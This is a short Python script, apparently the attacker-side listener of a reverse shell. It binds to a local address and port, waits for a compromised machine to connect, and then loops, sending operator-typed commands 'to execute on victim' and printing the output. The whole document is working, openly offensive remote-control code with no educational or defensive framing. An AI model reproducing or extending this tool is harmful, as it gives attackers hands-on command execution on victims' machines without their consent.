import socket

hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hacker_ip = "192.168.100.17"
hacker_port = 10000
hacker_socket.bind((hacker_ip, hacker_port))
hacker_socket.listen(1)

print("Listening for incoming connection...")
client_socket, client_address = hacker_socket.accept()
print(f"Connected with {client_address}")

while True:
    command = input("Enter command to execute on victim: ")

    if command == "stop":
        client_socket.send(command.encode())
        break

    try:
        client_socket.send(command.encode())
    except BrokenPipeError:
        print("Connection lost. Victim disconnected.")
        break

    try:
        response = client_socket.recv(65535)
        print(response.decode('utf-8'))
    except Exception as e:
        print(f"Error receiving response: {e}")

client_socket.close()
